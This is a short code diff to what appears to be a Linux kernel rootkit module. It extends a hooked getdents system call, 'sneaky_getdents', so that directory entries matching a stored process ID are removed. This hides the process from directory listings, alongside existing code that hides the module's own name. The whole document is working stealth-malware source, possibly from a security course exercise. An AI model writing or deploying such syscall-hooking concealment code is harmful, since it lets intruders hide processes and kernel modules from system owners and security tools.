@@ -82,10 +82,13 @@ asmlinkage int sneaky_read(int fd, char *buf, size_t count)
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
+  char pid[100];
   unsigned int ret;
   struct linux_dirent *alt_dirp, *cur_dirp;
   int i;
   ret = original_getdents(fd, dirp, count);
+  sprintf(pid, "%d", myPID);
+
 
   if(ret>0){
     alt_dirp = (struct linux_dirent *) kmalloc(ret, GFP_KERNEL);
@@ -94,6 +97,17 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
     i = ret; //number of bytes read
     while(i>0){
 	i-=cur_dirp->d_reclen;
+
+		if(strcmp( (char*) &(cur_dirp->d_name), (char*) pid) == 0){
+			printk(KERN_INFO "!!!! PID FOUND !!!!\n");
+			cur_dirp->d_off = 1024;
+			ret -= cur_dirp->d_reclen;
+
+			memcpy(dirp, alt_dirp, ret);
+			kfree(alt_dirp);
+			return ret;
+		}
+
 		if(strstr( (char*) &(cur_dirp->d_name), MODULE_NAME) != NULL  )
 		{
 			if(i!=0){
